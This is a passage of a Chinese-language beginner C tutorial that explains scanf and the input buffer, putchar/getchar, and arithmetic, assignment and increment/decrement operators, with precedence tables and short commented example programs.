<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;number);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %d\n&quot;</span>, number);</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;value);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value = %d\n&quot;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="comment">// 可以输入 数字 空格 数字, 或者 数字 回车 数字</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;number, &amp;value);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %d\n&quot;</span>, number);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value = %d\n&quot;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="comment">// 输入 数字,数字 即可</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d&quot;</span>, &amp;number, &amp;value);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %d\n&quot;</span>, number);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value = %d\n&quot;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>\n是scanf函数的结束符号, 所以格式化字符串中不能出现\n</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line">    <span class="comment">// 输入完毕之后按下回车无法结束输入</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>, &amp;number);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %d\n&quot;</span>, number);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="scanf运行原理"><a href="#scanf运行原理" class="headerlink" title="scanf运行原理"></a>scanf运行原理</h2><ul>
<li>系统会将用户输入的内容先放入输入缓冲区</li>
<li>scanf方式会从输入缓冲区中逐个取出内容赋值给变量</li>
<li>如果输入缓冲区的内容不为空,scanf会一直从缓冲区中获取,而不要求再次输入</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num1;</span><br><span class="line">    <span class="keyword">int</span> num2;</span><br><span class="line">    <span class="keyword">char</span> ch1;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%c%d&quot;</span>, &amp;num1, &amp;ch1, &amp;num2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num1 = %d, ch1 = %c, num2 = %d\n&quot;</span>, num1, ch1, num2);</span><br><span class="line">    <span class="keyword">char</span> ch2;</span><br><span class="line">    <span class="keyword">int</span> num3;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c%d&quot;</span>,&amp;ch2, &amp;num3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ch2 = %c, num3 = %d\n&quot;</span>, ch2, num3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>利用fflush方法清空缓冲区(不是所有平台都能使用)</p>
<ul>
<li>格式: fflush(stdin);</li>
<li>C和C++的标准里从来没有定义过 fflush(stdin)</li>
<li>MSDN 文档里清除的描述着”fflush on input stream is an extension to the C standard” （fflush 是在标准上扩充的函数, 不是标准函数, 所以不是所有平台都支持）</li>
</ul>
</li>
<li><p>利用setbuf方法清空缓冲区(所有平台有效)</p>
<ul>
<li>格式: <code>setbuf(stdin, NULL);</code></li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num1;</span><br><span class="line">    <span class="keyword">int</span> num2;</span><br><span class="line">    <span class="keyword">char</span> ch1;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%c%d&quot;</span>, &amp;num1, &amp;ch1, &amp;num2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num1 = %d, ch1 = %c, num2 = %d\n&quot;</span>, num1, ch1, num2);</span><br><span class="line">    <span class="comment">//fflush(stdin); // 清空输入缓存区</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>); <span class="comment">// 清空输入缓存区</span></span><br><span class="line">    <span class="keyword">char</span> ch2;</span><br><span class="line">    <span class="keyword">int</span> num3;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c%d&quot;</span>,&amp;ch2, &amp;num3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ch2 = %c, num3 = %d\n&quot;</span>, ch2, num3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="putchar和getchar"><a href="#putchar和getchar" class="headerlink" title="putchar和getchar"></a>putchar和getchar</h2><ul>
<li>putchar: 向屏幕输出一个字符</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="built_in">putchar</span>(ch); <span class="comment">// 输出a</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>getchar: 从键盘获得一个字符</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    ch = getchar();<span class="comment">// 获取一个字符</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ch = %c\n&quot;</span>, ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="运算符基本概念"><a href="#运算符基本概念" class="headerlink" title="运算符基本概念"></a>运算符基本概念</h2><p>和数学中的运算符一样, C语言中的运算符是告诉程序执行特定算术或逻辑操作的符号</p>
<ul>
<li><p>例如告诉程序, 某两个数相加, 相减,相乘等</p>
</li>
<li><p>什么是表达式</p>
<ul>
<li>表达式就是利用运算符链接在一起的有意义,有结果的语句;</li>
<li>例如: a + b; 就是一个算数表达式, 它的意义是将两个数相加, 两个数相加的结果就是表达式的结果</li>
<li>注意: 表达式一定要有结果</li>
</ul>
</li>
</ul>
<h2 id="运算符分类"><a href="#运算符分类" class="headerlink" title="运算符分类"></a>运算符分类</h2><ul>
<li>按照功能划分:<ul>
<li>算术运算符</li>
<li>赋值运算符</li>
<li>关系运算符</li>
<li>逻辑运算符</li>
<li>位运算符</li>
</ul>
</li>
<li>按照参与运算的操作数个数划分:<ul>
<li>单目运算<ul>
<li>只有一个操作数 如 : i++;</li>
</ul>
</li>
<li>双目运算<ul>
<li>有两个操作数 如 : a + b;</li>
</ul>
</li>
<li>三目运算<ul>
<li>C语言中唯一的一个,也称为问号表达式 如: a&gt;b ? 1 : 0;</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="运算符的优先级和结合性"><a href="#运算符的优先级和结合性" class="headerlink" title="运算符的优先级和结合性"></a>运算符的优先级和结合性</h2><ul>
<li>早在小学的数学课本中,我们就学习过”从左往右,先乘除后加减,有括号的先算括号里面的”, 这句话就蕴含了优先级和结合性的问题</li>
<li>C语言中,运算符的运算优先级共分为15 级。1 级最高,15 级最低<ul>
<li>在C语言表达式中,不同优先级的运算符, 运算次序按照由高到低执行</li>
<li>在C语言表达式中,相同优先级的运算符, 运算次序按照结合性规定的方向执行</li>
</ul>
</li>
</ul>
<p><img src="/2022/01/15/C/56c97e103145e96707a17273cebcdf6a.png" alt="img"></p>
<p><img src="/2022/01/15/C/89de357c15677f49a7316c497a6d3fc7.png" alt="img"></p>
<h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><table>
<thead>
<tr>
<th align="center"><strong>优先级</strong></th>
<th align="center"><strong>名称</strong></th>
<th align="center"><strong>符号</strong></th>
<th align="center"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">3</td>
<td align="center">乘法运算符</td>
<td align="center">*</td>
<td align="center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">除法运算符</td>
<td align="center">/</td>
<td align="center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">求余运算符 (模运算符)</td>
<td align="center">%</td>
<td align="center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">加法运算符</td>
<td align="center">+</td>
<td align="center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">减法运算符</td>
<td align="center">-</td>
<td align="center">双目运算符,具有左结合性</td>
</tr>
</tbody></table>
<p>注意事项</p>
<ul>
<li>如果参与运算的两个操作数皆为整数, 那么结果也为整数</li>
<li>如果参与运算的两个操作数其中一个是浮点数, 那么结果一定是浮点数</li>
<li>求余运算符, 本质上就是数学的商和余”中的余数</li>
<li>求余运算符, 参与运算的两个操作数必须都是整数, 不能包含浮点数</li>
<li>求余运算符, 被除数小于除数, 那么结果就是被除数</li>
<li>求余运算符, 运算结果的正负性取决于被除数,跟除数无关, 被除数是正数结果就是正数,被除数是负数结果就是负数</li>
<li>求余运算符, 被除数为0, 结果为0</li>
<li>求余运算符, 除数为0, 没有意义(不要这样写)</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">5</span>;</span><br><span class="line">    <span class="comment">// 加法</span></span><br><span class="line">    <span class="keyword">int</span> result = a + b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, result); <span class="comment">// 15</span></span><br><span class="line">    <span class="comment">// 减法</span></span><br><span class="line">    result = a - b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, result); <span class="comment">// 5</span></span><br><span class="line">    <span class="comment">// 乘法</span></span><br><span class="line">    result = a * b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, result); <span class="comment">// 50</span></span><br><span class="line">    <span class="comment">// 除法</span></span><br><span class="line">    result = a / b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, result); <span class="comment">// 2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 算术运算符的结合性和优先级</span></span><br><span class="line">    <span class="comment">// 结合性: 左结合性, 从左至右</span></span><br><span class="line">    <span class="keyword">int</span> c = <span class="number">50</span>;</span><br><span class="line">    result = a + b + c; <span class="comment">// 15 + c;  65;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, result);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 优先级: * / % 大于 + -</span></span><br><span class="line">    result = a + b * c; <span class="comment">// a + 250; 260;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 整数除以整数, 结果还是整数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, <span class="number">10</span> / <span class="number">3</span>); <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 参与运算的任何一个数是小数, 结果就是小数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>, <span class="number">10</span> / <span class="number">3.0</span>); <span class="comment">// 3.333333</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 10 / 3 商等于3, 余1</span></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">10</span> % <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 左边小于右边, 那么结果就是左边</span></span><br><span class="line">    result = <span class="number">2</span> % <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, result); <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 被除数是正数结果就是正数,被除数是负数结果就是负数</span></span><br><span class="line">    result = <span class="number">10</span> % <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">    result = <span class="number">-10</span> % <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, result); <span class="comment">// -1</span></span><br><span class="line">    result = <span class="number">10</span> % <span class="number">-3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><table>
<thead>
<tr>
<th align="center">优先级</th>
<th align="center"><strong>名称</strong></th>
<th align="center"><strong>符号</strong></th>
<th align="center"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">14</td>
<td align="center">赋值运算符</td>
<td align="center">=</td>
<td align="center">双目运算符,具有右结合性</td>
</tr>
<tr>
<td align="center">14</td>
<td align="center">除后赋值运算符</td>
<td align="center">/=</td>
<td align="center">双目运算符,具有右结合性</td>
</tr>
<tr>
<td align="center">14</td>
<td align="center">乘后赋值运算符 (模运算符)</td>
<td align="center">*=</td>
<td align="center">双目运算符,具有右结合性</td>
</tr>
<tr>
<td align="center">14</td>
<td align="center">取模后赋值运算符</td>
<td align="center">%=</td>
<td align="center">双目运算符,具有右结合性</td>
</tr>
<tr>
<td align="center">14</td>
<td align="center">加后赋值运算符</td>
<td align="center">+=</td>
<td align="center">双目运算符,具有右结合性</td>
</tr>
<tr>
<td align="center">14</td>
<td align="center">减后赋值运算符</td>
<td align="center">-=</td>
<td align="center">双目运算符,具有右结合性</td>
</tr>
</tbody></table>
<ul>
<li>简单赋值运算符</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 简单的赋值运算符 =</span></span><br><span class="line">    <span class="comment">// 会将=右边的值赋值给左边</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %i\n&quot;</span>, a); <span class="comment">// 10</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>复合赋值运算符</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="comment">// 复合赋值运算符 += -= *= /= %=</span></span><br><span class="line">     <span class="comment">// 将变量中的值取出之后进行对应的操作, 操作完毕之后再重新赋值给变量</span></span><br><span class="line">     <span class="keyword">int</span> num1 = <span class="number">10</span>;</span><br><span class="line">     <span class="comment">// num1 = num1 + 1; num1 = 10 + 1; num1 = 11;</span></span><br><span class="line">     num1 += <span class="number">1</span>;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;num1 = %i\n&quot;</span>, num1); <span class="comment">// 11</span></span><br><span class="line">     <span class="keyword">int</span> num2 = <span class="number">10</span>;</span><br><span class="line">     <span class="comment">// num2 = num2 - 1; num2 = 10 - 1; num2 = 9;</span></span><br><span class="line">     num2 -= <span class="number">1</span>;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;num2 = %i\n&quot;</span>, num2); <span class="comment">// 9</span></span><br><span class="line">     <span class="keyword">int</span> num3 = <span class="number">10</span>;</span><br><span class="line">     <span class="comment">// num3 = num3 * 2; num3 = 10 * 2; num3 = 20;</span></span><br><span class="line">     num3 *= <span class="number">2</span>;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;num3 = %i\n&quot;</span>, num3); <span class="comment">// 20</span></span><br><span class="line">     <span class="keyword">int</span> num4 = <span class="number">10</span>;</span><br><span class="line">     <span class="comment">// num4 = num4 / 2; num4 = 10 / 2; num4 = 5;</span></span><br><span class="line">     num4 /= <span class="number">2</span>;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;num4 = %i\n&quot;</span>, num4); <span class="comment">// 5</span></span><br><span class="line">     <span class="keyword">int</span> num5 = <span class="number">10</span>;</span><br><span class="line">     <span class="comment">// num5 = num5 % 3; num5 = 10 % 3; num5 = 1;</span></span><br><span class="line">     num5 %= <span class="number">3</span>;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;num5 = %i\n&quot;</span>, num5); <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>结合性和优先级</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">10</span>;</span><br><span class="line">    <span class="comment">// 赋值运算符优先级是14, 普通运算符优先级是3和4, 所以先计算普通运算符</span></span><br><span class="line">    <span class="comment">// 普通运算符中乘法优先级是3, 加法是4, 所以先计算乘法</span></span><br><span class="line">    <span class="comment">// number += 1 + 25; number += 26; number = number + 26; number = 36;</span></span><br><span class="line">    number += <span class="number">1</span> + <span class="number">5</span> * <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %i\n&quot;</span>, number); <span class="comment">// 36</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="自增自减运算符"><a href="#自增自减运算符" class="headerlink" title="自增自减运算符"></a>自增自减运算符</h2><ul>
<li>在程序设计中,经常遇到“i=i+1”和“i=i-1”这两种极为常用的操作。</li>
<li>C语言为这种操作提供了两个更为简洁的运算符,即++和–</li>
</ul>
<table>
<thead>
<tr>
<th align="center">优先级</th>
<th align="center"><strong>名称</strong></th>
<th align="center">符号</th>
<th align="center"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">2</td>
<td align="center">自增运算符(在后)</td>
<td align="center">i++</td>
<td align="center">单目运算符,具有左结合性</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">自增运算符(在前)</td>
<td align="center">++i</td>
<td align="center">单目运算符,具有右结合性</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">自减运算符(在后)</td>
<td align="center">i–</td>
<td align="center">单目运算符,具有左结合性</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">自减运算符(在前)</td>
<td align="center">–i</td>
<td align="center">单目运算符,具有右结合性</td>
</tr>
</tbody></table>
<ul>
<li>自增<ul>
<li>如果只有<em><strong>单个</strong></em>变量, 无论++写在前面还是后面都会对变量做+1操作</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">10</span>;</span><br><span class="line">    number++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %i\n&quot;</span>, number); <span class="comment">// 11</span></span><br><span class="line">    ++number;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %i\n&quot;</span>, number); <span class="comment">// 12</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>如果出现在一个表达式中, 那么++写在前面和后面就会有所区别<ul>
<li>前缀表达式:++x, –x;其中x表示变量名,先完成变量的自增自减1运算,再用x的值作为表达式的值;即“先变后用”,也就是变量的值先变,再用变量的值参与运算</li>
<li>后缀表达式:x++, x–;先用x的当前值作为表达式的值,再进行自增自减1运算。即“先用后变”,也就是先用变量的值参与运算,变量的值再进行自增自减变化</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">10</span>;</span><br><span class="line">    <span class="comment">// ++在后, 先参与表达式运算, 再自增</span></span><br><span class="line">    <span class="comment">// 表达式运算时为: 3 + 10;</span></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">3</span> + number++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 13</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %i\n&quot;</span>, number); <span class="comment">// 11</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">10</span>;</span><br><span class="line">    <span class="comment">// ++在前, 先自增, 再参与表达式运算</span></span><br><span class="line">    <span class="comment">// 表达式运算时为: 3 + 11;</span></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">3</span> + ++number;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 14</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %i\n&quot;</span>, number); <span class="comment">// 11</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>自减</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">10</span>;</span><br><span class="line">    <span class="comment">// --在后, 先参与表达式运算, 再自减</span></span><br><span class="line">    <span class="comment">// 表达式运算时为: 10 + 3;</span></span><br><span class="line">    <span class="keyword">int</span> result = number-- + <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 13</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %i\n&quot;</span>, number); <span class="comment">// 9</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">10</span>;</span><br><span class="line">    <span class="comment">// --在前, 先自减, 再参与表达式运算</span></span><br><span class="line">    <span class="comment">// 表达式运算时为: 9 + 3;</span></span><br><span class="line">    <span class="keyword">int</span> result = --number + <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 12</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %i\n&quot;</span>, number); <span class="comment">// 9</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>注意点:<ul>
<li>自增、自减运算只能用于单个变量,只要是标准类型的变量,不管是整型、实型,还是字符型变量等,但不能用于表达式或常量<ul>
<li>错误用法: <code>++(a+b); 5++;</code></li>
</ul>
</li>
<li>企业开发中尽量让++ – 单独出现, 尽量不要和其它运算符混合在一起</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> b = i++; <span class="comment">// 不推荐</span></span><br><span class="line">或者</span><br><span class="line"><span class="keyword">int</span> b = ++i; <span class="comment">// 不推荐</span></span><br><span class="line">或者</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> b = ++a + a++;  <span class="comment">// 不推荐</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>请用如下代码替代</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> b = i; <span class="comment">// 推荐</span></span><br><span class="line">i++;</span><br><span class="line">或者;</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">int</span> b = i; <span class="comment">// 推荐</span></span><br><span class="line">或者</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">++a;</span><br><span class="line"><span class="keyword">int</span> b = a + a; <span class="comment">// 推荐</span></span><br><span class="line">a++;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>C语言标准没有明确的规定，<code>同一个表达式中同一个变量自增或自减后如何运算</code>, 不同编译器得到结果也不同, 在企业开发中千万不要这样写</li>
</ul>
